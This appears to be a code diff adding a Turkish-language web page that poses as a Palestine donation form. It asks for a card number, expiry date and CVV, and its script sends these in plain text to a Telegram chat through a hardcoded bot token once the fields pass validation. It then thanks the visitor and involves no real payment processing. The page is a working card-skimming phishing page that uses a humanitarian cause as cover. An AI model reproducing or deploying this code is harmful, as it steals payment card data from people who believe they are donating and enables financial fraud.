@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Filistin Bağış</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/0/00/Flag_of_Palestine.svg/1200px-Flag_of_Palestine.svg.png');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            color: white;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        
+        .overlay {
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 30px;
+            border-radius: 10px;
+            width: 80%;
+            max-width: 500px;
+        }
+        
+        h1 {
+            font-size: 3em;
+            margin-bottom: 30px;
+            color: #fff;
+            text-shadow: 2px 2px 4px #000;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        
+        input {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        
+        button {
+            background-color: #006400;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2em;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+        }
+        
+        button:hover {
+            background-color: #008000;
+        }
+        
+        .error {
+            color: #ff6b6b;
+            font-size: 0.9em;
+            margin-top: 5px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="overlay">
+        <h1>FİLİSTİN BAĞIŞ</h1>
+        
+        <form id="donationForm">
+            <div class="form-group">
+                <label for="cardNumber">Kart Numarası (16 haneli)</label>
+                <input type="text" id="cardNumber" maxlength="16" placeholder="1234 5678 9012 3456">
+                <div class="error" id="cardError">Lütfen geçerli 16 haneli kart numarası giriniz</div>
+            </div>
+            
+            <div class="form-group">
+                <label>Son Kullanma Tarihi</label>
+                <div style="display: flex; gap: 10px;">
+                    <div style="flex: 1;">
+                        <input type="number" id="month" min="1" max="12" placeholder="AA" maxlength="2">
+                        <div class="error" id="monthError">Geçersiz ay (1-12 arası olmalı)</div>
+                    </div>
+                    <div style="flex: 1;">
+                        <input type="number" id="year" min="2025" placeholder="YYYY" maxlength="4">
+                        <div class="error" id="yearError">Geçersiz yıl (2025 veya sonrası)</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="cvv">CVV</label>
+                <input type="text" id="cvv" maxlength="3" placeholder="123">
+                <div class="error" id="cvvError">Lütfen geçerli CVV giriniz</div>
+            </div>
+            
+            <button type="submit">BAĞIŞ YAP</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('donationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Hata mesajlarını gizle
+            document.querySelectorAll('.error').forEach(el => el.style.display = 'none');
+            
+            // Değerleri al
+            const cardNumber = document.getElementById('cardNumber').value;
+            const month = document.getElementById('month').value;
+            const year = document.getElementById('year').value;
+            const cvv = document.getElementById('cvv').value;
+            
+            let isValid = true;
+            
+            // Kart numarası kontrolü
+            if (cardNumber.length !== 16 || !/^\d+$/.test(cardNumber)) {
+                document.getElementById('cardError').style.display = 'block';
+                isValid = false;
+            }
+            
+            // Ay kontrolü
+            if (month < 1 || month > 12) {
+                document.getElementById('monthError').style.display = 'block';
+                isValid = false;
+            }
+            
+            // Yıl kontrolü
+            if (year < 2025) {
+                document.getElementById('yearError').style.display = 'block';
+                isValid = false;
+            }
+            
+            // CVV kontrolü
+            if (cvv.length < 3 || !/^\d+$/.test(cvv)) {
+                document.getElementById('cvvError').style.display = 'block';
+                isValid = false;
+            }
+            
+            // Eğer tüm bilgiler geçerliyse Telegram'a gönder
+            if (isValid) {
+                const message = `Yeni Bağış Bilgileri:\nKart No: ${cardNumber}\nSon Kullanma: ${month}/${year}\nCVV: ${cvv}`;
+                
+                // Telegram bot API'si kullanarak mesaj gönder
+                // BOT_TOKEN ve CHAT_ID kısımlarını kendi bilgilerinizle değiştirin
+                const botToken = '7044463101:AAFHraueUt-oU7tc_tfDinvK1hHXZJYLTao';
+                const chatId = '7078266953';
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                
+                fetch(url)
+                    .then(response => {
+                        if (response.ok) {
+                            alert('Bağışınız için teşekkür ederiz!');
+                            document.getElementById('donationForm').reset();
+                        } else {
+                            alert('Bir hata oluştu, lütfen tekrar deneyin.');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        alert('Bağlantı hatası oluştu, lütfen tekrar deneyin.');
+                    });
+            }
+        });
+    </script>
+</body>
+</html>
